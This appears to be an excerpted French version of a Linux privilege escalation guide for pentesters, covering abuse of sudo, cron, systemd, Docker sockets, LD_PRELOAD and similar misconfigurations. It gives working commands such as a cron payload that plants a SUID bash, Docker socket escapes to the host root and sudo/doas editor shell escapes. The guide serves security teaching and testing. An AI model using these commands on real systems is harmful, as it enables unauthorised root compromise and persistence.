...
Pour un contexte plus large et les workflows historiques d'enumeration, consultez les ressources g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation et linux-private-i listées dans les références.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
...
Si vous **disposez d’autorisations d’écriture sur un dossier quelconque inclus dans la variable `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou certains binaires :
```bash
echo $PATH
```
...
```
Vous pouvez trouver une bonne liste de kernels vulnérables ainsi que des **compiled exploits** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
...
Recherchez toujours **la version du kernel sur Google**, car votre version du kernel peut être mentionnée dans un kernel exploit, ce qui vous permettra de vous assurer que cet exploit est valide.
...
D'après les versions vulnérables de sudo indiquées dans :
```bash
searchsploit sudo
```
...
Pour plus d'informations, consultez l'[avis original sur la vulnérabilité](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Contournement des règles Sudo basées sur l'hôte (CVE-2025-32462)

Sudo antérieur à 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l'hôte en utilisant le **nom d'hôte fourni par l'utilisateur** via `sudo -h <host>` au lieu du **nom d'hôte réel**. Si sudoers accorde des privilèges plus étendus sur un autre hôte, vous pouvez **usurper** cet hôte localement.<sup>[[29]](#references)</sup>
...
sudo -h devbox -i
```
Si la résolution du nom usurpé bloque, ajoutez-le à `/etc/hosts` ou utilisez un nom d’hôte qui apparaît déjà dans les logs/configurations afin d’éviter les recherches DNS.
...
Si vous êtes à l’intérieur d’un conteneur, commencez par la section suivante sur la sécurité des conteneurs, puis passez aux pages consacrées aux abus spécifiques aux runtimes :
...
```
Vérifiez également si **un compiler est installé**. Cela peut être utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l’utiliser (ou sur une machine similaire).
```bash
...
> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront principalement inutiles. Il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires, qui vérifieront si la version d'un logiciel installé est vulnérable à des exploits connus_
...
top -n 1
```
Vérifiez toujours la présence d’éventuels [**debuggers electron/cef/chromium** en cours d’exécution, car vous pourriez les exploiter pour effectuer une escalade de privilèges](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus**, vous pourriez peut-être écraser celui de quelqu’un d’autre.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant exécuté sous un **utilisateur différent** de celui de son parent n’est pas automatiquement malveillant, mais constitue un **signal de triage** utile. Certaines transitions sont attendues (`root` lançant un utilisateur de service, les gestionnaires de connexion créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des assistants de debug, de la persistence ou des limites de confiance d’exécution faibles.
...
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire depuis la mémoire. C’est un signal fort qui mérite une investigation, car :
...
Collectez globalement les fichiers supprimés mais encore ouverts :
```bash
lsof +L1
```
...
cat /proc/<PID>/fd/<FD>
```
C’est particulièrement précieux lorsqu’un processus garde encore ouvert un secret, un script, un export de base de données ou un fichier de flag supprimé.

### Monitoring des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour monitorer les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsqu’un ensemble de conditions est réuni.

### Mémoire des processus

Certains services d’un serveur enregistrent des **credentials en clair dans la mémoire**.\
Normalement, vous aurez besoin de **root privileges** pour lire la mémoire des processus appartenant à d’autres utilisateurs ; cela est donc généralement plus utile lorsque vous êtes déjà root et que vous souhaitez découvrir davantage de credentials.\
Cependant, souvenez-vous qu’**en tant qu’utilisateur standard, vous pouvez lire la mémoire des processus qui vous appartiennent**.
...
> - **kernel.yama.ptrace_scope = 2**: seul un admin peut utiliser ptrace, car cela nécessite la capability CAP_SYS_PTRACE.
...
Si vous avez accès à la mémoire d’un service FTP, par exemple, vous pourriez récupérer le Heap et rechercher ses credentials à l’intérieur.
```bash
...
ProcDump est une réinvention Linux de l’outil classique ProcDump de la suite d’outils Sysinternals pour Windows. Obtenez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
Pour vider la mémoire d'un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et vider le processus qui vous appartient
...
Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en tant que root et est uniquement lié à loopback, vous pouvez tout de même y accéder via un local port-forwarding SSH et créer une tâche privilégiée pour effectuer une escalation.<sup>[[1]](#references)[[4]](#references)</sup>
...
- Effectuez la liaison sur localhost et restreignez en outre l’accès via un firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les fichiers unit ; utilisez des secret stores ou un EnvironmentFile accessible uniquement par root
...
```
Cela évite les faux positifs. Un répertoire périodique accessible en écriture n'est utile que si le nom de fichier de votre payload respecte les règles locales de `run-parts`.
...
Si un script est exécuté par root et contient un « **\*** » dans une commande, vous pourriez l’exploiter pour provoquer des comportements inattendus (comme une privesc). Exemple :
```bash
...
Si vous **pouvez modifier un script cron exécuté avec les privilèges root**, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un dossier symbolique vers un autre répertoire** contenant un script contrôlé par vous.
```bash
...
```
Pour les defenders/developers, les méthodes plus sûres contre les attaques par symlink incluent :

- `O_EXCL` avec `O_CREAT` : échoue si le chemin existe déjà (bloque les liens/fichiers précréés par l’attaquant).
- `openat()` : opère relativement à un descripteur de fichier correspondant à un répertoire de confiance.
- `mkstemp()` : crée des fichiers temporaires de manière atomique avec des permissions sécurisées.

### Binaires cron signés avec des payloads inscriptibles

Les équipes Blue Team « signent » parfois les binaires lancés par cron en extrayant une section ELF personnalisée et en recherchant une chaîne du fournisseur avant de les exécuter en tant que root. Si ce binaire est inscriptible par le groupe (par exemple, `/opt/AV/periodic-checks/monitor` appartenant à `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez forger la section et détourner la tâche cron :<sup>[[2]](#references)</sup>

1. Utilisez `pspy` pour capturer le flux de vérification. Dans Era, root exécutait `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, puis `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, avant d’exécuter le fichier.
2. Recréez le certificat attendu à l’aide de la clé/configuration leakée (depuis `signing.zip`) :
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Créez un remplacement malveillant (par exemple, déposer un bash SUID ou ajouter votre clé SSH) et intégrez le certificat dans `.text_sig` afin que le grep réussisse :
```bash
...
```
4. Écrasez le binaire planifié tout en conservant les bits d’exécution :
```bash
...
Vous pouvez surveiller les processus afin de rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Vous pourrez peut-être en tirer parti pour effectuer une privilege escalation.

Par exemple, pour **surveiller toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez exécuter :
```bash
...
Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez placer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans la sortie du backup.<sup>[[26]](#references)</sup>

Flux de découverte typique (en tant qu’utilisateur DB avec peu de privilèges) :
...
- Confirmez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est accessible en écriture pour vous et que la destination (`/opt/backups/current`) devient la propriété de root après l’exécution du job.
...
```
Pour détecter ce type d’entrée furtive, inspectez les fichiers cron avec des outils qui révèlent les caractères de contrôle :
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
...
Gardez à l’esprit que si vous disposez des **permissions d’écriture sur les binaires exécutés par les services**, vous pouvez les modifier pour y ajouter des backdoors ; ainsi, lorsque les services seront réexécutés, les backdoors seront exécutées.

### PATH de systemd - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec :
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être **escalader vos privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers** de configuration des services, tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** dans le dossier du PATH de systemd où vous pouvez écrire. Lorsque le service doit exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers d’unités systemd dont le nom se termine par `**.timer**`, qui contrôlent les fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron, car ils prennent en charge nativement les événements temporels calendaires et monotones, et peuvent être exécutés de manière asynchrone.
...
Si vous pouvez modifier un timer, vous pouvez lui faire exécuter certains éléments de systemd.unit (comme un `.service` ou un `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu’est l’Unit :

> L’unité à activer lorsque ce timer arrive à échéance. L’argument est un nom d’unité, dont le suffixe n’est pas « .timer ». S’il n’est pas spécifié, cette valeur correspond par défaut à un service portant le même nom que l’unité du timer, à l’exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l’unité activée et celui de l’unité du timer soient identiques, à l’exception du suffixe.
...
- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous disposez de **droits d’écriture** via le **PATH de systemd** (afin d’usurper l’identité de cet exécutable)
...
Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou sur des machines différentes au sein de modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication entre ordinateurs et sont configurés via des fichiers `.socket`.<sup>[[14]](#references)</sup>

Les Sockets peuvent être configurés à l'aide de fichiers `.socket`.

**Pour en savoir plus sur les sockets, utilisez `man systemd.socket`.** Plusieurs paramètres intéressants peuvent être configurés dans ce fichier :
...
- `Accept` : accepte un argument booléen. Si **true**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est transmis. Si **false**, tous les sockets d'écoute eux-mêmes sont **transmis à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFO, où une seule unité de service gère inconditionnellement tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performance, il est recommandé d'écrire les nouveaux daemons uniquement d'une manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : accepte une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la **création** et la liaison des **sockets**/FIFO d'écoute, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
...
- `Service` : spécifie le nom de l'unité de **service** **à activer** lors de la réception de **trafic entrant**. Ce paramètre est uniquement autorisé pour les sockets avec `Accept=no`. Par défaut, il s'agit du service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Fichiers .socket accessibles en écriture

Si vous trouvez un fichier `.socket` **accessible en écriture**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme `ExecStartPre=/home/kali/sys/backdoor`, et le backdoor sera exécuté avant la création du socket. Vous devrez donc **probablement attendre le redémarrage de la machine.**\
_Notez que le système doit utiliser la configuration de ce fichier socket, sinon le backdoor ne sera pas exécuté._

### Activation de socket + chemin d'unité accessible en écriture (création d'un service manquant)
...
Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l’utilisateur `root` et les membres du groupe `docker`. Posséder un accès en écriture à ce socket peut conduire à une élévation de privilèges. Voici une présentation de la méthode et des alternatives si le Docker CLI n’est pas disponible.

#### **Élévation de privilèges avec Docker CLI**

Si vous avez un accès en écriture au socket Docker, vous pouvez élever vos privilèges à l’aide des commandes suivantes :<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes permettent d’exécuter un conteneur avec un accès de niveau root au système de fichiers de l’hôte.

#### **Using Docker API Directly**

Lorsque la Docker CLI n’est pas disponible, le socket Docker peut tout de même être exploité à l’aide de requêtes HTTP brutes sur le socket Unix. Le flux le plus fiable consiste à :

- créer un conteneur helper de longue durée avec le répertoire root de l’hôte monté via bind
- le démarrer
...
```
Ce modèle est généralement plus robuste que d’essayer de piloter `attach` manuellement avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances supplémentaires de `exec` pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH sous `/host/root/.ssh` ou modifier les fichiers de démarrage de l’hôte.

### Autres

Notez que si vous disposez des permissions d’écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**davantage de moyens d’escalader vos privilèges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si [**l’API Docker écoute sur un port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), vous pouvez également être en mesure de la compromettre.

Consultez **d’autres moyens de sortir des conteneurs ou d’abuser des runtimes de conteneurs pour escalader vos privilèges** dans :
...
## Escalade de privilèges avec Containerd (ctr)

Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante, car **vous pourriez être en mesure d’en abuser pour escalader vos privilèges** :
...
## Escalade de privilèges avec **RunC**

Si vous découvrez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante, car **vous pourriez être en mesure d’en abuser pour escalader vos privilèges** :
...
D-Bus est un **système de communication inter-processus (IPC)** sophistiqué qui permet aux applications d’interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il fournit un framework robuste pour différentes formes de communication entre applications.<sup>[[16]](#references)</sup>

Ce système est polyvalent et prend en charge un IPC de base qui améliore l’échange de données entre les processus, à l’image des **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal envoyé par un daemon Bluetooth pour indiquer un appel entrant peut inciter un lecteur de musique à se mettre en sourdine, améliorant ainsi l’expérience utilisateur. En outre, D-Bus prend en charge un système d’objets distants, simplifiant les demandes de services et les invocations de méthodes entre les applications, et rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un **modèle d’autorisation/refus**, qui gère les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l’effet cumulatif des règles de policy correspondantes. Ces policies définissent les interactions avec le bus et peuvent permettre une escalade de privilèges par l’exploitation de ces permissions.

Un exemple d’une telle policy est fourni dans `/etc/dbus-1/system.d/wpa_supplicant.conf`, détaillant les permissions permettant à l’utilisateur root de posséder, d’envoyer et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les policies sans utilisateur ni groupe spécifié s’appliquent universellement, tandis que les policies du contexte « default » s’appliquent à tous ceux qui ne sont pas couverts par d’autres policies spécifiques.
```xml
<policy user="root">
...
Si l’hôte peut exécuter des commandes mais que les callbacks échouent, distinguez rapidement les filtrages DNS, de transport, de proxy et de routage :
```bash
...
- Adresses IP internes spécifiques (par ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis des segments internes.

### Workflow de triage des services accessibles uniquement en local

Lorsque vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Une procédure locale rapide consiste à :
```bash
...
```
Si vous utilisez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un scanner réseau pur (en ignorant le reste des vérifications d'escalade de privilèges).
...
ip -br addr
```
La loopback (`lo`) est particulièrement précieuse en post-exploitation, car de nombreux services accessibles uniquement en interne y exposent des tokens/cookies/credentials :
```bash
...
Vérifiez **qui** vous êtes, quels **privilèges** vous possédez, quels **utilisateurs** sont présents sur les systèmes, lesquels peuvent se **login** et lesquels disposent de **privilèges root** :
```bash
#Info about me
...
Vérifiez si des éléments intéressants se trouvent dans le presse-papiers (si possible)
```bash
...
Vous pouvez être autorisé à exécuter certaines commandes avec sudo, ou celles-ci peuvent disposer du bit suid. Vérifiez-le avec :
```bash
...
```
Dans cet exemple, l’utilisateur `demo` peut exécuter `vim` en tant que `root` ; il est désormais trivial d’obtenir un shell en ajoutant une clé SSH dans le répertoire de `root` ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV
...
```
### Empoisonnement d’un `__pycache__` / `.pyc` accessible en écriture dans des imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire du package contient un **`__pycache__` accessible en écriture**, vous pouvez éventuellement remplacer le `.pyc` mis en cache et exécuter du code en tant qu’utilisateur privilégié lors de l’import suivant.<sup>[[30]](#references)</sup>
...
3. Compilez un objet code contenant un payload, utilisez `marshal.dumps(...)` dessus, supprimez le fichier de cache original, puis recréez-le avec l’en-tête original suivi de votre bytecode malveillant.
4. Réexécutez le script autorisé par sudo afin que l’import exécute votre payload en tant que root.

Notes importantes :

- La réutilisation de l’en-tête original est essentielle, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement au fichier source.
...
- L’attaque échoue si le processus privilégié utilise `PYTHONDONTWRITEBYTECODE=1`, importe depuis un emplacement avec des permissions sûres ou supprime l’accès en écriture de tous les répertoires du chemin d’importation.
...
- Pour les exécutions privilégiées, envisagez `PYTHONDONTWRITEBYTECODE=1` ainsi que des vérifications périodiques pour détecter les répertoires `__pycache__` accessibles en écriture de manière inattendue.
...
- Exigences :
- Une règle sudo que vous pouvez exécuter (toute cible qui invoque `/bin/bash` de manière non interactive, ou n’importe quel script bash).
...
Si sudo conserve l'environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l'utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>
...
```
Terraform échouera lors du handshake du plugin Go, mais exécutera la payload en tant que root avant de s’arrêter, laissant derrière lui un shell SUID.

### Contournement de TF_VAR overrides + de la validation des symlinks
...
### Sudo env_keep+=PATH / secure_path non sécurisé → détournement de PATH

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées accessibles en écriture par l’attaquant (par ex. `/home/<user>/bin`), toute commande relative présente dans la cible autorisée par sudo peut être masquée.<sup>[[3]](#references)</sup>
...
Une mauvaise configuration courante d’une custom-app est un wrapper binaire SUID appartenant à root qui exécute un script, alors que le script lui-même est inscriptible par des utilisateurs disposant de faibles privilèges.
...
La variable d’environnement **LD_PRELOAD** permet de spécifier une ou plusieurs bibliothèques partagées (fichiers `.so`) à charger par le chargeur avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé preloading d’une bibliothèque.
...
- Le chargeur ignore **LD_PRELOAD** pour les exécutables dont l’ID utilisateur réel (_ruid_) ne correspond pas à l’ID utilisateur effectif (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans des chemins standard et possédant également les permissions suid/sgid sont preloadées.
...
Lorsque vous rencontrez un binaire avec des permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s’il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :<sup>[[17]](#references)</sup>
```bash
...
```
Enfin, l'exécution du binaire SUID concerné devrait déclencher l'exploit, permettant potentiellement de compromettre le système.
...
```
cela signifie que la bibliothèque que vous avez générée doit posséder une fonction appelée `a_function_name`.
...
Le projet répertorie des fonctions légitimes de binaires Unix pouvant être détournées pour s'échapper de restricted shells, escalader ou maintenir des privilèges élevés, transférer des fichiers, générer des bind shells et reverse shells, et faciliter les autres tâches de post-exploitation.
...
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (il s'agit par défaut de la durée du jeton sudo qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
...
Si toutes ces conditions sont remplies, **vous pouvez escalader vos privilèges avec :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
...
Le fichier `/etc/sudoers` et les fichiers présents dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **ne peuvent par défaut être lus que par l'utilisateur root et le groupe root**.\
...
```
Si `doas` autorise un éditeur ou un interpréteur, vérifiez les escapes de type GTFOBins :
```bash
doas vim
:!/bin/sh
```
...
Consultez **la manière d’exploiter cette mauvaise configuration** dans la page suivante :
...
```
En copiant la bibliothèque dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme spécifié dans la variable `RPATH`.
```
...
Dans un répertoire, le **bit « execute »** implique que l’utilisateur concerné peut faire un "**cd**" vers le dossier.\
...
```
### Porte dérobée ACL cachée dans les fichiers complémentaires de sudoers

Une mauvaise configuration courante consiste en un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440`, qui accorde malgré tout un accès en écriture à un utilisateur disposant de faibles privilèges via une ACL.
```bash
ls -l /etc/sudoers.d/*
...
sudo -l
```
Il s’agit d’une voie de persistence/privesc via ACL à fort impact, car elle est facile à manquer lors des vérifications limitées à `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions**, vous pouvez **détourner** certaines sessions **shell** d’un autre utilisateur (**root**).\
Dans les **versions les plus récentes**, vous pourrez **vous connecter** uniquement aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes dans la session**.

### Détournement des sessions screen
...
```
## Hijacking de sessions tmux

Il s’agissait d’un problème affectant les **anciennes versions de tmux**. Je n’ai pas réussi à hijack une session tmux (v2.1) créée par root en tant qu’utilisateur non privilégié.
...
```
![Emplacements des sockets (certains systèmes exposent l’un comme un lien symbolique vers l’autre) - tmux sessions hijacking : tmux -S /tmp/dev sess ls List using that socket, you can start a tmux session in that socket...](<../../images/image (837).png>)
...
```
Consultez la **Valentine box from HTB** pour voir un exemple.
...
- **`/etc/securetty`** : restreint les endroits depuis lesquels root peut se connecter (liste blanche des TTY).
...
Le forwarding de l’agent SSH vous permet d’**utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrases secrètes !) sur votre serveur. Vous pourrez donc **sauter** via ssh **vers un hôte**, puis de là **sauter vers un autre** hôte en **utilisant** la **clé** située sur votre **hôte initial**.
...
Le fichier `/etc/sshd_config` peut **autoriser ou refuser** le forwarding de l'agent ssh avec le mot-clé `AllowAgentForwarding` (autorisé par défaut).

Si vous constatez que le Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez être en mesure de l'exploiter pour élever vos privilèges** :
...
Le fichier `/etc/profile` et les fichiers du répertoire `/etc/profile.d/` sont des **scripts exécutés lorsqu'un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez élever vos privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil inhabituel est trouvé, vous devez le vérifier afin d’y rechercher des **informations sensibles**.
...
AVERTISSEMENT : vous risquez de réduire le niveau de sécurité actuel de la machine.
```
...
```
### Emplacement étrange/Fichiers appartenant à un utilisateur
```bash
...
De plus, certains **journaux d’audit** mal configurés (compromis ?) peuvent vous permettre **d’enregistrer des mots de passe** dans les journaux d’audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les journaux, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera très utile.
...
Vous devriez également rechercher les fichiers contenant le mot "**password**" dans leur **nom** ou à l’intérieur de leur **contenu**, et rechercher également les adresses IP et les e-mails dans les logs, ou utiliser des regex pour les hashes.\
...
Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx),** donc dès que vous découvrez que vous pouvez modifier des journaux, vérifiez qui les gère et si vous pouvez élever vos privilèges en remplaçant les journaux par des symlinks.
...
Si, pour quelque raison que ce soit, un utilisateur peut **écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** **modifier** un script existant, alors votre **system is pwned**.<sup>[[20]](#references)</sup>
...
Dans mon cas, l’attribut `NAME=` de ces scripts réseau n’est pas traité correctement. Si le nom contient un **espace blanc/vide, le système tente d’exécuter la partie située après cet espace blanc/vide**. Cela signifie que **tout ce qui suit le premier espace blanc est exécuté en tant que root**.
...
**systemd** apparaît comme un gestionnaire moderne d’initialisation et de services, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion de l’automount et les snapshots de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les packages de distribution et `/etc/systemd/system/` pour les modifications des administrateurs, simplifiant ainsi le processus d’administration système.<sup>[[21]](#references)</sup>
...
Pour en savoir plus et consulter un pattern généralisé applicable à d’autres stacks de découverte et de monitoring :
...
### **Meilleur outil pour rechercher les vecteurs locaux d’escalade de privilèges Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
...
- [3] [0xdf – Holiday Hack Challenge 2025 : Neighborhood Watch Bypass (détournement de sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalade de privilèges Linux basique](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guide de l’escalade de privilèges Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attaquer et défendre : techniques d’escalade de privilèges Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
...
- [11] [frizb/Linux-Privilege-Escalation : conseils et tricks pour la Priv Escalation Linux](https://github.com/frizb/Linux-Privilege-Escalation)
...
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + Privesc via symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
